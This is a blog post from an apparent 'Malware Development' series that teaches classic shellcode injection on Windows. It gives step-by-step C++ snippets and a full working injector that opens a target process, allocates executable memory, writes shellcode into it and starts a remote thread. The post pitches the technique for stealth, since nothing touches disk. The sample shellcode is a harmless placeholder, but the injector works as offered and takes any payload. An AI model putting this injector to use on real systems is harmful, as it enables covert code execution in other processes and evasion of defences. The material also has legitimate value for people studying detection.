---
title: "Process Injection: Classic Shellcode Injection"
date: 2025-06-14 12:22:22
categories: [Malware Development, Process Injection]  
tags: [windows, shellcode, injection, process-injection, cpp]
---

Welcome to another post in the Malware Development series. In this article, we’ll break down **Classic Shellcode Injection**—one of the most fundamental and widely used process injection techniques. We’ll explain each step in detail, describe what’s happening under the hood, and provide clear C code samples along the way. At the end, you’ll find a full working example.

---

## What is Classic Shellcode Injection?

Classic shellcode injection is the process of injecting raw, position-independent code (shellcode) into the memory of another running process and then executing it. Shellcode is typically a small, handcrafted assembly payload designed to perform a specific action, such as spawning a shell or downloading a file. Unlike PE injection, shellcode is just a sequence of CPU instructions with no headers or sections[5](https://rioasmara.com/2025/05/30/shellcode-the-art-of-in-memory-code-injection-a-deep-dive-for-security-enthusiasts/)[6](https://redfoxsec.com/blog/process-injection-harnessing-the-power-of-shellcode/).

---

## Why Use Shellcode Injection?

- **Stealth:** The injected code never appears as a file on disk.
    
- **Simplicity:** The technique is straightforward and effective.
    
- **Flexibility:** Works with any process you have access to, and can execute arbitrary code.
    

---

## Step-by-Step Classic Shellcode Injection

## 1. Locate the Target Process
First, you need to identify the process you want to inject into. This could be any running process—commonly something benign like `notepad.exe` or `explorer.exe`. You can enumerate processes using APIs like `CreateToolhelp32Snapshot` or, for demonstration, use `FindWindow` to get a PID by window name.

**Sample Code:**
```Cpp
// Example: Find the PID of Notepad by its window title
HWND hwnd = FindWindowW(L"Notepad", NULL);
DWORD targetPID = 0;
if (hwnd) {
    GetWindowThreadProcessId(hwnd, &targetPID);
}
if (targetPID == 0) {
    printf("Target process not found.\n");
    exit(1);
}

```


---

## 2. Obtain a Handle to the Target Process

With the PID in hand, you need to open the process with sufficient privileges to allocate memory, write to it, and create threads.

**Sample Code:**
```cpp
HANDLE hProcess = OpenProcess(
    PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
    FALSE,
    targetPID
);
if (hProcess == NULL) {
    printf("OpenProcess failed. Error: %d\n", GetLastError());
    exit(1);
}

```

---

## 3. Allocate Memory in the Target Process

You must allocate a memory region in the target process that is large enough for your shellcode and marked as executable. This is done with `VirtualAllocEx`.

**Sample Code:**
```cpp
unsigned char shellcode[] = { 0x90, 0x90, 0x90, 0xCC, 0xC3 }; // Example shellcode (NOPs + INT3 + RET)
SIZE_T shellcodeSize = sizeof(shellcode);

LPVOID remoteMem = VirtualAllocEx(
    hProcess,
    NULL,
    shellcodeSize,
    MEM_COMMIT | MEM_RESERVE,
    PAGE_EXECUTE_READWRITE
);
if (remoteMem == NULL) {
    printf("VirtualAllocEx failed. Error: %d\n", GetLastError());
    CloseHandle(hProcess);
    exit(1);
}

```
---

## 4. Write the Shellcode to the Allocated Memory

Now, copy your shellcode from your process into the target process’s memory using `WriteProcessMemory`.

**Sample Code:**

```cpp
if (!WriteProcessMemory(hProcess, remoteMem, shellcode, shellcodeSize, NULL)) {
    printf("WriteProcessMemory failed. Error: %d\n", GetLastError());
    VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    exit(1);
}
```

---

## 5. Execute the Injected Shellcode

Finally, create a new thread in the target process that starts execution at the address of your shellcode. This is done with `CreateRemoteThread`.

**Sample Code:**
```cpp
HANDLE hThread = CreateRemoteThread(
    hProcess,
    NULL,
    0,
    (LPTHREAD_START_ROUTINE)remoteMem,
    NULL,
    0,
    NULL
);
if (hThread == NULL) {
    printf("CreateRemoteThread failed. Error: %d\n", GetLastError());
    VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    exit(1);
}
printf("Shellcode injected and thread started!\n");

````

---

## Full Working Example

```cpp
#include <windows.h>
#include <stdio.h>

int main() {
    // 1. Find Notepad PID (for demo)
    HWND hwnd = FindWindowW(L"Notepad", NULL);
    DWORD targetPID = 0;
    if (hwnd) {
        GetWindowThreadProcessId(hwnd, &targetPID);
    }
    if (targetPID == 0) {
        printf("Target process not found.\n");
        return 1;
    }

    // 2. Open target process
    HANDLE hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
        FALSE,
        targetPID
    );
    if (hProcess == NULL) {
        printf("OpenProcess failed. Error: %d\n", GetLastError());
        return 1;
    }

    // 3. Allocate memory for shellcode
    unsigned char shellcode[] = { 0x90, 0x90, 0x90, 0xCC, 0xC3 }; // Example shellcode
    SIZE_T shellcodeSize = sizeof(shellcode);

    LPVOID remoteMem = VirtualAllocEx(
        hProcess,
        NULL,
        shellcodeSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    if (remoteMem == NULL) {
        printf("VirtualAllocEx failed. Error: %d\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }

    // 4. Write shellcode to remote process
    if (!WriteProcessMemory(hProcess, remoteMem, shellcode, shellcodeSize, NULL)) {
        printf("WriteProcessMemory failed. Error: %d\n", GetLastError());
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // 5. Create remote thread to execute shellcode
    HANDLE hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)remoteMem,
        NULL,
        0,
        NULL
    );
    if (hThread == NULL) {
        printf("CreateRemoteThread failed. Error: %d\n", GetLastError());
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    printf("Shellcode injected and thread started!\n");

    // Cleanup
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}

```
---

## Conclusion

Classic shellcode injection is the foundation of many process injection techniques. By following these steps—finding a target, opening it, allocating memory, writing shellcode, and creating a remote thread—you can execute arbitrary code in another process’s context. This method is simple, effective, and forms the basis for more advanced injection strategies
